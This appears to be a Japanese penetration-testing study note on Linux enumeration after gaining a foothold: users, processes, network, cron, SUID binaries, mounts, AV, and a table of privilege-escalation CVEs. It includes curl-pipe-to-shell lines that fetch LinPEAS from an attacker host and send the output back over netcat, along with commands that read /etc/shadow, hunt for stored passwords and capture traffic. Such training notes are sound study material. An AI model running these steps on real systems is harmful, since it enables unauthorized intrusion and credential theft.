- 関連のノート：
	- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md)

---

# 自動化ツールによる列挙

## 目的

- Enumerationを自動化し、すばやく権限昇格ベクターを見つける
- 権限昇格後においても、すばやく機密情報を探索するために使う

> [!WARNING]
> 過検知や見逃しの可能性を常に考慮する。手動でしか発見できないようなそのターゲットシステム独自の構成は自動化ツールには発見できない。

## 実行コマンド

==LinPEAS==は誤検知が多いため、手動での検査はもちろん、unix-privesc-checkでもスキャンする

unix-privesc-check
	standardモードの方が、detailedモードよりも実行スピードが早く、誤検出も少ない
```zsh
# 通常実行（実行時にエラーが表示されるが問題なく実行できている）
./unix-privesc-check standard > output.txt
cat output.txt | grep -i warning

# 💡Targetのメモリで実行し、出力は攻撃者のマシンに保存する
python -m http.server 8888 # Attacker
nc -lvnp 9002 | tee unix-privesc-check.out #Attacker
curl <attacker_IP>:8888/unix-privesc-check | sh -s standard | nc -q 0 <attacker_IP> 9002 #Target
```
- WARNINGの箇所のみ注目で良い

LinPEAS
```zsh
# 通常実行
./linpeas.sh

# 💡Targetのメモリで実行し、出力は攻撃者のマシンに保存する
python -m http.server 8888 # Attacker
nc -lvnp 9002 | tee linpeas.out #Attacker
curl <attacker_IP>:8888/linpeas.sh | sh | nc -q 0 <attacker_IP> 9002 #Target
```

LinEnum
```sh
# ダウンロード
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh

# 実行
./LinEnum.sh -k password -r linenum.out -e /tmp/ -t
```

### 補足：結果の見方

- unusual, unknown, unexpectedなどを見逃さない
- 95% vectorであっても誤検知の可能性有り

#### "Linux Exploit Suggester" でよく検出するCVEリスト

- 偽陽性の可能性を疑うが、つまったら最後に必ずすべて試す
	- Exposure（エクスプロイトの実行可能性）は当てにならない
- [主なカーネルエクスプロイト](💥Linux%20Privilege%20Escalation.md#主なカーネルエクスプロイト)

| エクスプロイト名                                                                | CVE            | エクスプロイトの仕組み                                                                                                                                                               | 使用条件                                                                                                                                  |
| ----------------------------------------------------------------------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| nft_object UAF (NFT_MSG_NEWSET)                                         | CVE-2022-32250 | Netfilterのnf_tablesにおけるUse-After-Freeの脆弱性を利用してカーネルメモリを操作し特権を奪取する。                                                                                                         | kernel.unprivileged_userns_cloneが1に設定され、CAP_NET_ADMIN権限を取得できる環境であること。                                                                 |
| nft_object UAF                                                          | CVE-2022-2586  | Netfilter内のnft_objectの二重解放（Use-After-Free）を悪用してカーネル空間で任意のコードを実行する。                                                                                                        | kernel.unprivileged_userns_cloneが有効であり、ユーザー名前空間を作成できること。                                                                              |
| DirtyPipe                                                               | CVE-2022-0847  | パイプバッファのフラグ管理の不備（PIPE_BUF_FLAG_CAN_MERGE）を突き、ページキャッシュ内の読み取り専用データに強制的に書き込む。                                                                                                | カーネルバージョンが5.8以上、かつ5.16.11 / 5.15.25 / 5.10.102より古いこと。                                                                                 |
| PwnKit                                                                  | CVE-2021-4034  | polkitのpkexecが引数（argc）が0の場合に環境変数を引数として誤認する不備を利用し、任意の共有ライブラリをロードさせる。                                                                                                       | polkitがインストールされており、pkexecバイナリにSUIDビットが設定されていること。                                                                                      |
| sudo Baron Samedit<br>([PoC](https://github.com/worawit/CVE-2021-3156)) | CVE-2021-3156  | sudoのコマンドライン引数解析において、エスケープ文字の処理不備に起因するヒープベースのバッファオーバーフローを発生させる。                                                                                                           | 特定の脆弱なバージョン（1.8.2から1.8.31p2、1.9.0から1.9.5p1）のsudoがインストールされていること。                                                                       |
| Netfilter heap OOB write                                                | CVE-2021-22555 | Netfilterの32ビット互換レイヤーにおけるsetsockoptの処理不備を利用し、ヒープ領域外へのゼロ書き込み（Out-of-Bounds write）を行う。                                                                                      | ユーザー名前空間が有効（unprivileged_userns_clone=1）であること。                                                                                        |
| Polkit pkexec Local Privilege Escalation                                | CVE-2021-3560  | polkitdのD-Bus認証メカニズムにおける競合状態（race condition）を悪用。D-Busメッセージを送信後すぐに切断することで、polkitdがタイムアウトし、認証チェックをスキップして権限昇格を実行する。具体的には、認証されていないユーザーがroot権限でアカウント作成やsudoers追加などの特権操作を実行できる。 | polkit version 0.105～0.118が対象。systemdベースのLinuxシステム（Ubuntu 20.04、Debian 10、RHEL 8など）で、polkitdサービスが稼働していること。D-Busメッセージングシステムが利用可能であること。 |


---

# ユーザー情報の列挙

## 目的

- ローカルユーザーやグループを確認し、利用可能なアカウントや権限を特定する

## ユーザー情報・ホスト名の列挙コマンド

==足場を獲得したらまずはじめに実施すること==

### 侵害したユーザーについて

現在のユーザーの権限と所属グループを表示
```zsh
id
```
- [IDの一覧表](../Common/権限関連の知識、コマンド.md#IDの一覧表)

==sudo権限の確認==
```zsh
sudo -l
```
- →[Sudoを利用したPrivEsc](💥Linux%20Privilege%20Escalation.md#Sudoを利用したPrivEsc)
- →`tcpdump`の場合、通信のキャプチャも可能：[デーモンの列挙コマンド](#デーモンの列挙コマンド)
- `NOPASSWD`：sudo xxxとしても、パスワード不要で実行可能

ホスト名を確認
	プロンプトに記載されているホスト名は管理者が任意の値に設定可能なため、必ずこのコマンドを実施
```zsh
hostname
```
- ホスト名：そのマシンの役割や種別を示すことが多い
	- 例：WEB01＝webサーバー、MSSQL01＝MSSQLサーバー

### 他のユーザー含む列挙

ターゲットとなるユーザーに目星をつけるため、ユーザー一覧を取得
```zsh
cat /etc/passwd
```
- [補足：/etc/passwdの出力](#補足：/etc/passwdの出力)

グループ一覧を取得
```zsh
# 出力："グループ名:パスワード:GID:グループメンバー"
cat /etc/group
```

どのユーザーが現在操作可能な状態かを知るため、現在ログイン中のユーザー一覧を表示
```zsh
who
```

アクティブなログインや実行中のコマンドを確認する
```zsh
w
```

頻繁にログインしているアカウントや、rootアカウントのリモートIPを把握するため、過去のログイン履歴を表示
```zsh
last
```

### 補足：/etc/passwdの出力

例：`joe:x:1000:1000:joe,,,:/home/joe:/bin/bash`

| フィールド              | 値         | 説明                                                             |
| ------------------ | --------- | -------------------------------------------------------------- |
| Login Name         | joe       | ログイン時に使用するユーザー名                                                |
| Encrypted Password | x         | パスワードハッシュを格納するフィールド。`x` の場合、実際のハッシュは `/etc/shadow` に保存される      |
| UID                | 1000      | ユーザーID。rootは常に0、通常ユーザーは1000から割り当てられる                           |
| GID                | 1000      | グループID。ユーザーが所属するプライマリグループを示す                                   |
| Comment            | joe,,,    | ユーザーの説明（コメント欄）。多くの場合は空白かユーザー名の繰り返し                             |
| Home Folder        | /home/joe | ・ログイン時に利用するホームディレクトリ<br>・💡`/home/[username]`の場合、一般ユーザーの可能性あり  |
| Login Shell        | /bin/bash | ・デフォルトのログインシェル<br>・💡ログインシェルが`..nologon`の場合、リモートまたはローカルログインが不可 |


---

# 基本的なシステム情報の列挙

## 目的

- マシンのOSやアーキテクチャ、バージョンを確認して、脆弱性や利用可能な攻撃ツールを特定する
	- カーネルエクスプロイトなどに利用する情報
	- [カーネルの脆弱性を利用したPrivEsc](💥Linux%20Privilege%20Escalation.md#カーネルの脆弱性を利用したPrivEsc)

## 基本的なシステム情報の列挙コマンド

OS+カーネル・アーキテクチャ+ディストリビューションの情報をまとめて明瞭に表示
	（使えない場合は`uname`などを使う）
```zsh
hostnamectl
```

カーネル・アーキテクチャ情報
```zsh
uname -a
```
	↓
```zsh
Linux 53d12eea1c2e 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 GNU/Linux

# Linux <hostname> <kernel version> <ビルド番号>-<このカーネルをビルドしたディストロ> SMP <ビルド日時><architecture> GNU/Linux
```

ディストリビューションの情報
```zsh
cat /etc/os-release
```
- `NAME`：ディストロ
- `ID_LIKE`：どのディストロ系列に近いか、を示す
	- （ディストロがkaliでもこの値がdebianのときはdebianのエクスプロイトが使えるかも）

## 得られる情報

- OSバージョン
- カーネルバージョン
- アーキテクチャ

---

# 実行中のプロセスの列挙

## 目的

- 実行中のプロセスを確認し、特権のあるプロセスや現在のユーザーによって実行されているプロセスを特定する
	- Unixではroot権限で実行されているプロセスも列挙可能

## プロセスの列挙コマンド

実行中プロセスの確認
```zsh
# 絞り込み：ps --pid <PID>
ps auxw
```
- ↓出力例
```zsh
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       20566  0.0  0.0      0     0 ?        I    00:07   0:00 [kworker/0:2-
root       20674  0.0  0.1   8360  3376 ?        S    00:09   0:00 /usr/sbin/CRO
```

### 補足：プロセス出力の見方

- COMMAND列の値が`[]`で囲まれているものは、カーネルスレッドといい、OSの核となる機能であるため、着目しなくてもよい（マルウェアがカーネルスレッドに偽装し自身を隠蔽することがあるが、ペンテストの文脈では優先度低）
- USER列がrootであり、かつ、COMMAND列が`[]`で囲まれていないものに着目する

#### STAT（プロセス状態）の意味

`STAT` 列には、そのプロセスが今何をしているかを示すアルファベットと付加記号が表示される

| 記号  | 意味             | 補足                          |
| --- | -------------- | --------------------------- |
| R   | 実行中 (Running)  | 今CPUを使っている状態                |
| S   | 停止中 (Sleeping) | 何かのイベント（入力待ちなど）を待っている状態     |
| D   | 割り込み不可         | ディスクI/O待ちなど、中断できない重い処理中     |
| Z   | ゾンビ (Zombie)   | 終了したが、親プロセスに終了報告が終わっていない抜け殻 |
| T   | 停止 (Stopped)   | ジョブ制御（Ctrl+Zなど）で一時停止されている   |
| <   | 優先度が高い         | ナイス値が低い                     |
| N   | 優先度が低い         | ナイス値が高い                     |
| s   | セッションリーダー      | シェルなど、他の子プロセスを持つもの          |
| +   | フォアグラウンドで動作中   |                             |

#### %MEM, VSZ, RSS の違い

これらはすべて「メモリ」に関する指標だが、見ている範囲が違う（着目の優先度は低い）

| 項目   | 正称                  | 意味                                          |
| ---- | ------------------- | ------------------------------------------- |
| RSS  | Resident Set Size   | 実際に使っている物理メモリ量<br>そのプロセスがRAMを何KB占有しているか     |
| VSZ  | Virtual Memory Size | 確保している仮想メモリの総量<br>ライブラリやスワップ分も含めた「予約済み」の全領域 |
| %MEM | Memory Percentage   | 物理メモリ全体に対する RSS の割合<br>RAMを何％食っているか         |

---

# ネットワーク情報の列挙

## 目的

- 利用可能なネットワークインターフェース、ルート、オープンポートを確認し、侵害したターゲットが複数のネットワークに接続されているかどうかを判断する
- ポートとサービスの結びつき(port binding)を調査する
	- ループバックアドレスでのみ利用可能なサービスは攻撃ベクターとして使えないか考慮する

## ネットワーク情報収集コマンド

すべてのネットワークインターフェース情報
```zsh
ip a
```

ルーティングテーブル確認
```zsh
# route、ip routeも可
routel
```
- 侵害した足場から内部NWへアクセスしたいときなど、そのマシンから他にどのマシンにアクセスできそうかを確認する第一歩
- →怪しいサブネットがあったら[Nmap Live Host Discovery](../../Misc/Nmap%20Live%20Host%20Discovery.md)でアクセス可能なIPアドレスを列挙する

アクティブなネットワーク接続とリスニングポートの確認
```zsh
# もしくはnetstat -anp
ss -anp
```
- 結果、`127.0.0.1:<port>`となっていたら、**ローカルサービス**の可能性が高い
	- ローカルサービスは公開サービスよりも脆弱性の管理がされていないため、エクスプロイトできる可能性が高い
	- ligolo-ngで容易にアクセス可能

FWのルールを確認する（非特権アカウントから）
	外からはアクセスできないように設定しているサービスは、ローカルからのアクセスのみを想定しているため、対策が不十分で脆弱な場合が多い
	ポートフォーワーディングの際に使えるポートを列挙する意味でも重要
```zsh
# iptables-persistent(Debian/Ubuntu)
cat /etc/iptables/rules.v*

# iptables-save の出力ファイル（管理者が手動保存したもの）
grep -r "iptables" /etc 2>/dev/null
cat [file]

# firewalld(RedHat)
cat /etc/firewalld/zones/*.xml

# ufw(Ubuntu)
ls /etc/ufw
cat /etc/ufw/user.rules
cat /etc/ufw/ufw.conf
```

ARPテーブルの確認（同じLAN上の通信可能な他のシステムを発見）
	補足：224-239はClassDで、マルチキャスト(1対多)専用
```zsh
arp -a
```

DNS設定の確認
```zsh
cat /etc/resolv.conf
```
→[53 - DNS](../Ports%20-%20Service/53%20-%20DNS.md)

## 得られる情報

- IPアドレス、サブネット、DNSサーバー
- 有効化されているFWプロファイル
- FWルールの許可/拒否設定
- 開いているネットワーク接続、ポート番号
- すべての接続
- ルーティングテーブル
	- 対象マシンを経由して他のサブネットにアクセスできる可能性を探る。
	- 他サブネットへのルートが存在すれば、そこを通じて新しいターゲットを列挙・攻撃可能 → [Port Redirection & SSH Port Forwarding](../Port%20Redirection/Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)

---

# Cronの列挙

## 目的

- 書き込み可能なファイルやバイナリがroot権限で実行されていないかを確認する
    - （PrivEscの攻撃ベクターとしてよく利用される）
- 💥ワイルドカートが使われていれば、GTFObinsで検索
	-  chown, chmod, tar, rsyncなど
- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Cronを利用したPrivEsc)

## Cronの列挙コマンド

システム全体で設定されている定期タスクを確認する
	root権限で実行される自作スクリプトがここに直接書き込まれているケースがある
```zsh
cat /etc/crontab
```
- 読み方： `* * * * * root cd /home/jack && bash id.sh` の場合、「毎分（`* * * * *`）」「rootユーザー」が「`/home/jack/id.sh`」を実行している。

ルート権限で実行される標準的なcronの列挙
```zsh
ls -lah /etc/cron*
```
- cronのファイル名はわかるが、cronの中身を `cat` で閲覧しないと、何のファイルを実行しているかまではわからない    
- ここで表示されるディレクトリやファイルの権限自体は無視する。なぜなら、cronそのものに権限がなくても、その中で実行されている外部ファイル（xxxx.sh など）の権限が書き込み可能（w）であれば攻撃可能だから。

![](../../Images/Pasted%20image%2020250911130420.png)

$$cat /etc/cron.daily/dpkg として中身を閲覧する必要あり$$


現在ログインしているユーザーが設定したcronを列挙
```zsh
# 権限があるならsudoをつけて他ユーザー分も確認
crontab -l
```

実際にどのジョブが動いているかをリアルタイムに近い形で追跡する（権限不足がほとんど）
```zsh
# No such file or directoryの場合はログファイルがsyslogでない、cron.logかも
grep "CRON" /var/log/syslog
```

> [!TIP]
> - `...(root) CMD...` となっていて、定期的に実行されているものが狙い目
> 	- →`ls -la` の実行で、呼び出されているスクリプトのパーミッションを確認

## 得られる情報

- スクリプトやファイルの中身を改変し、悪意ある処理を実行させられる
    - `/etc/crontab` に直接記述されたスクリプトへの細工
    - root権限で実行される標準的なcronが参照するファイルへの細工
    - 管理者自作のcronが呼び出すバイナリの置換

---

# インストール済みアプリケーションの列挙

## 目的

- インストールされているソフトウェアやそのバージョンを特定し、使用できるエクスプロイトに目星を付ける
	- （手動でやると非常に時間がかかるが、方法は知っておく必要がある）

## インストール済みアプリケーションの列挙コマンド

インストールされているすべてのパッケージのリストを取得する
	（[Normal Informations](../../Misc/Normal%20Informations.md#パッケージ)）
```zsh
# debian
dpkg -l
# redhat
rpm -qa
# pacman
pacman -Q
```

---

# アクセス制限が不十分なファイル/ディレクトリの列挙

## 目的

- 特権が割り当てられたファイルを発見する
- ハードコードされた認証情報を発見する

## アクセス制限が不十分なファイル/ディレクトリの列挙コマンド

書込み/実行/読み取り可能なファイルを特定
```zsh
find / -type f -writable -exec ls -la {} \; 2>/dev/null | grep -v "proc" | grep <current_username>
```

全ユーザー(o: others)が書込み可能なディレクトリ
```zsh
find / -type d -perm -o+w -exec ls -ld {} \; 2>/dev/null
```

現在のユーザーが書込み可能なディレクトリを特定
	ノイズは多いが、例えばcronで実行されるスクリプトのパスが書込み可能な場合がある
```zsh
find / -writable -type d 2>/dev/null
```

---

# マウントされていないドライブの列挙

## 目的

- マウントされていないドライブを発見する
	- ⚠他のユーザーがマウント済みのデバイスに再マウントはできない
- マウントできる場合はそこにある認証情報や重要データを取得する

## マウントされていないドライブの列挙コマンド

どのデバイスをどのディレクトリにマウントするかのルール（**マウントの設定**）
	`fstab`は起動時に読み込まれマウントされるが、`noauto`オプションの場合は手動マウント
```zsh
cat /etc/fstab 
```
- ここにないドライブをマウントしている可能性もあるので、`mount`による列挙も必須
- [🔍Linux Enumeration](#fstabの結果の見方)

![](../../Images/Pasted%20image%2020250827123908.png)

$$fstabの結果例$$

マウント済みファイルシステムの列挙（**マウントの現状**）
```zsh
mount
```

> [!TIP]
> [マウント仮想ファイルシステム](../../Misc/Normal%20Informations.md#マウント仮想ファイルシステム)は着目の優先度は低い 

![](../../Images/Pasted%20image%2020250826124828.png)

$$mountの実行結果例$$

利用可能なストレージ・パーティションを確認（未マウント領域も含む）
```zsh
lsblk -f
```
- blk：HDD、SSD、USBメモリ、CD-ROM（sr0）、仮想ディスク（loopデバイス）、SDカードなどの「ブロックデバイス」のこと

## 補足：マウント列挙の結果の見方

### 着目点

#### fstabとmountの差分

- `fstab`(マウントのルール)に記載があるのに、`mount`(マウントの現状)には存在しない
	-  `noauto`オプションにより手動でマウントすべきものがマウントされていない可能性アリ
	- →`user`オプションもあれば、マウントして利用できるかも([🔍Linux Enumeration](#fstabの結果の見方))
```zsh
# マウント具体例：mount /media/usb0
# マウントできない場合は、攻撃者のマシンに<fstabのfile_system>を転送してローカルでマウント
mount <fstabのmount_point>
cd <fstabのmount_point>
```

#### lsblkの結果

- `lsblk -f`の結果MOUNTPOINTが空白、かつ、FSTYPEが通常のファイルシステム（※）である
	- →未マウント領域の可能性があるためマウントを試みる（⚠️fstabの結果、`user`オプションのあるmount pointでないと一般権限ではマウント不可）
- （※）通常のファイルシステム：
	- `ext4`, `xfs`, `ntfs`, `vfat` → 通常ファイルシステムで、中にファイルがある可能性がある
	- `swap` → スワップ領域。直接ファイル操作はできないが、機密情報がメモリから落ちている場合の観点では意識する
	- `crypto_LUKS` → 暗号化されている。鍵なしでは中身は見えないが、暗号化ボリュームの存在は把握しておく

- （`squash`は読み取り専用の圧縮ファイルシステムで着目しないでよい）

### fstabの結果の見方

- UUID：一意の場所を指定（[権限関連の知識、コマンド](../Common/権限関連の知識、コマンド.md#IDの一覧表)）
- file system：マウント対象のディスク・パーティション（マウント元）
- mount point：file systemをどこに接続するか（マウント先）
- option：マウントオプション
	- **user**：一般ユーザーもマウント可能
	- **noauto**：起動時には自動でマウントされず、手動で mount しない限りアクセスできない
- type：ファイルシステムの種類
	- swap：メモリ上のデータを一時的にディスクに退避させる場所で、機密情報が暗号化されずに残っている可能性がある（OSはswapに退避させるとき暗号化しないことが多い）

![](../../Images/Pasted%20image%2020250827123908.png)

---

# 高権限をもつバイナリの列挙

## 目的

- SUID/SGID、Capability が設定された実行ファイルを探し、権限昇格に利用できる可能性を調査
- root 所有の SUID バイナリを悪用できれば、root 権限を奪取できる
- SGIDバイナリはグループの権限で動作可能なため、同じグループの他ユーザーへのLatMovにつながる
	- →[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#SUIDとCapabilityを利用したPrivEsc)

## SUID / SGIDバイナリの列挙コマンド

システム全体からSUID(4000)が設定されたバイナリを検索
```zsh
find / -type f \( -perm -4000 \) -exec ls -la {} \; 2>/dev/null
```
- 🚨GTFObinsでヒットしなくても、LinPEASの結果で`Unknow SUID binary!`という表記や脆弱性があれば注目すること

システム全体からSGID(2000)が設定されたバイナリを検索
```zsh
find / -type f \( -perm -2000 \) -exec ls -la {} \; 2>/dev/null
```

## Capablityが設定されたバイナリの列挙

ルートから探索
```zsh
/usr/sbin/getcap -r / 2>/dev/null
```
	↓
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
- `cap_setuid`：プロセスのユーザーID（UID）を自由に変更できる→GTFOBinsで検索
- `ep`(effective & permitted)：権限が有効で、かつ実行可能
	- その他、`p`だけなどの場合もある

---

# 興味深い情報の列挙

## 目的

- 保存されたパスワードやキャッシュされた資格情報を取得する
	- そのまま**ダイレクトに**LatMovやPrivEscにつなげる
	- 発見した認証情報をもとに、新たなパスワードリストを作成してブルートフォースを実施する[Password Attack](../Common/Password%20Attack.md)

- 💡Googleで、`<service> where is [database] password stored`と検索するのもよい手段

## 機密情報の列挙コマンド

環境変数の確認
	`env`：現在のセッションに反映されている環境変数を定義
	`.bashrc`：ターミナルが起動されるたびに追加される環境変数を定義（構文にミスがあればenvに反映されない）
```zsh
env
```
↓出力に興味深い値があれば、それが固定の環境変数かどうかを確認する
```zsh
# zshを使っている場合は.zshrc
cat ~/.bashrc
```

パスワードファイルの確認
```zsh
cat /etc/passwd
cat /etc/shadow
```

SSHキーの確認
```zsh
ls -la ~/.ssh/
```
- →秘密鍵があった場合：[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Misc)

中身に認証情報の記載があるファイルを探す ([EvilTree](https://github.com/t3l3machus/eviltree)）
```zsh
# 拡張子はターゲットシステムに応じて追記する（cnf等）
grep -EiR "pass(word)?|pwd|credential" --include=\*.{txt,ini,cfg,conf,config,xml,ps1,git,yml,php} . 2>/dev/null  
```
```zsh
# eviltree.pyのダウンロード
wget https://raw.githubusercontent.com/t3l3machus/eviltree/refs/heads/main/eviltree.py

# 正規表現
python3 eviltree.py -r <dir> -i -v -x ".{0,3}passw.{0,3}[=]{1}.{0,18}"

# キーワードベース
python3 eviltree.py -r <dir> -i -v -k passw,db_,admin,account,user,token,pwd,key
```
- `-i`：Interesiting only
- `-v`：どのキーワードがマッチしたか表示
- `-x ".{0,3}passw.{0,3}[=]{1}.{0,18}"`：`passw` を含み、その近くに `=` があり、右側に値っぽいものがあるのを抽出
> [!WARNING]
> - gzやzipファイル等の圧縮ファイルの中身は読み取れないことに留意する（機密情報が圧縮ファイルにある可能性）
> - Googleで調べることを優先し、このコマンドは補助として使うこと

認証情報の記載があるバイナリを探す
```zsh
python3 eviltree.py -r <dir> -i -b -k passw,db_,admin,account,user,token,pwd
```
```zsh
strings <binary_file> | grep -Ei "pass(word)?|pwd|credential"
```

ファイルを広く探す
```zsh
# 探索したい拡張子が他にもあれば、-o -name "*.<ext>"を追加
find / -type f \( -name "*.txt" -o -name "*.ini" \) 2>/dev/null
```

所有者と所有グループにread権限が限定されているファイルの探索
	※root昇格後の横展開に使うテクニック
```zsh
# 必要であればgrep -v <word> | grep -v <word>で除外
find / -type f \( -perm 440 -o -perm 640 -o -perm 660 \) 2>/dev/null
```
- `440` = `r--r-----` (所有者:r、グループ:r、その他:なし)
- `640` = `rw-r-----` (所有者:rw、グループ:r、その他:なし)
- `660` = `rw-rw----` (所有者:rw、グループ:rw、その他:なし)

---

# システムデーモンの列挙

## 目的

- バックグラウンドで動作するデーモンの挙動を観察し、平文パスワードや認証情報の漏洩を発見する
- デーモンが送受信する通信内容に機密情報がないかを確認する
	（システムデーモン ≒ Windowsのサービス）

## デーモンの列挙コマンド

リアルタイムにプロセスの状況を確認（[pspy - GitHub](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)）
```zsh
# 代替案(ミリ秒のプロセスは見逃す)：watch -n 1 "ps aux | grep pass"
./pspy64 -p -i 1000
```
- デーモンにより定期的に一瞬だけ実行されるプロセスも見逃さない

通信上やり取りされているパスワードをキャプチャする
```zsh
# 簡易版：sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i <intarface> -vvv -w output.pcap
```
>[!TIP]
>root権限が必要なので、他マシンと通信している可能性がある場合は、権限昇格後に必ず実行し、[🦈Wireshark](../../Tools/🦈Wireshark.md)を使って分析

起動しているデーモンの状態を確認
　（サービス≒デーモン）
```zsh
systemctl list-units --type=service
```
- 怪しいデーモン([Normal Informations](../../Misc/Normal%20Informations.md#デーモン))が動作していないかを確認→[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Serviceを利用したPrivEsc)

起動時に自動起動されるデーモンの確認
```zsh
systemctl list-unit-files --type=service
```

---

# 共有フォルダ、SNMP情報の探索

## 目的

- 重要なファイルや共有フォルダを特定し、潜在的な機密情報や攻撃経路を見つける。

## 共有フォルダ、SNMP情報の探索コマンド

NFSのエクスポート情報を確認
```zsh
cat /etc/exports
```

SNMPデータを取得
```zsh
snmpwalk -v1 -c public localhost
```
→[161,162 - SNMP](../Ports%20-%20Service/161,162%20-%20SNMP.md)

## 得られる情報

- 共有フォルダの情報
- SNMP経由で得られるネットワークデバイス情報

---

# デバイスドライバ・カーネルモジュールの列挙

## 目的

- 利用中のカーネルモジュールやドライバのバージョンを把握
- 既知の脆弱性に対してエクスプロイトを紐づけるための情報を収集する
	- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#主なカーネルエクスプロイト)にも情報収集方法あり

## ドライバ・モジュール関連コマンド

ロードされているモジュール一覧
```zsh
lsmod
```

特定モジュールの詳細情報を確認（バージョン・依存関係など）
```zsh
/sbin/modinfo [module_name]
```

ドライバのロード情報やエラー、脆弱なモジュールの情報を見つけるため、カーネルリングバッファを表示
```zsh
dmesg | less
```

---

# AVの列挙

## 目的

- マシンにインストールされているアンチウイルス（AV）ソフトウェアを特定し、そのステータスや詳細情報を収集する

## AVの列挙コマンド

複数のAVの同時確認
```zsh
command -v clamav sophos-av avast rkhunter chkrootkit
```
```zsh
systemctl status sophos-av mcafee avguard eset-nod32
```

複数のアンチウイルスプロセスの確認
```zsh
ps aux | grep -i "virus\|clam\|sophos\|mcafee\|symantec\|kaspersky\|eset"
```

## 得られる情報

- インストールされているAVの名前
- AVのバージョンや状態

---
